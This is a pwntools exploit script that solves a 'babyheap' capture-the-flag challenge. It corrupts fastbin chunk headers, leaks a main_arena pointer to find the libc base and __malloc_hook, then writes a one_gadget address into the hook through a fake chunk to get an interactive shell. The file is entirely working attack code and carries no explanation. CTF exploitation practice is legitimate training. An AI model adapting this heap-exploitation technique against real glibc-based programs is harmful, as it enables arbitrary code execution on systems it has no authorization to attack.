from pwn import *

#context.log_level='debug'

binary='./babyheap'
s=process('./babyheap')

def Allocate(size):
	s.sendline("1")
	s.recvuntil("Size: ")
	s.sendline(size)
	s.recvuntil("Command: ")

def Fill(index, size, content):
	s.sendline("2")
	s.recvuntil("Index: ")
	s.sendline(index)
	s.recvuntil("Size: ")
	s.sendline(size)
	s.recvuntil("Content: ")
	s.sendline(content)
	s.recv(1024)

def Free(index):
	s.sendline("3")
	s.recvuntil("Index: ")
	s.sendline(index)
	s.recvuntil("Command: ")	

def Dump(index):
	s.sendline("4")
	s.recvuntil("Index: ")
	s.sendline(index)
	s.recvuntil("Content: \n")
	leak=u64(s.recv(6).ljust(8,"\x00"))
	print 'Leak Arena : ' + str(hex(leak))
	s.recv()
	return leak

def Exit():
	s.sendline("5")
	s.recv(1024)


s.recvuntil("Command: ")
Allocate("32")  #0 (index)
Allocate("32")  #1
Allocate("32")  #2
Allocate("32")  #3
Allocate("128") #4

# free to point *fd->smallbin
Free("1")
Free("2")

Fill("0", "97", p64(0)*5+p64(0x31)+p64(0)*5+p64(0x31)+p8(0xc0))

# small bin resize 0x91->0x31
Fill("3", "48", p64(0)*5+p64(0x31)) 

Allocate("32") #1
Allocate("32") #2 (point to smallbin)

Fill("3", "48", p64(0)*5+p64(0x91)) # resize fastbin->smallbin

Allocate("128") #5 allocate smallbin

Free("4") # free smallbin
arena_leak=Dump("2")

libc_leak=arena_leak-0x3c4b78
malloc_hook=libc_leak+0x3c4b10
print 'libc_leak: ' + str(hex(libc_leak))
print 'malloc_hook: '+ str(hex(malloc_hook))

fake_chunk=malloc_hook-0x23
print 'I will use this addr as fake_chunk: ' + str(hex(fake_chunk))

oneshot=libc_leak+0x4526a

Allocate("104") #0x7F-17
Free("4")

Fill("2", "8", p64(fake_chunk))

Allocate("104") #4
Allocate("104") #6

Fill("6", "27", "\x00"*3+p64(0)*2+p64(oneshot))
print 'Exploited !! :< '

s.sendline("1")
s.recv()
s.sendline("104")

s.interactive()
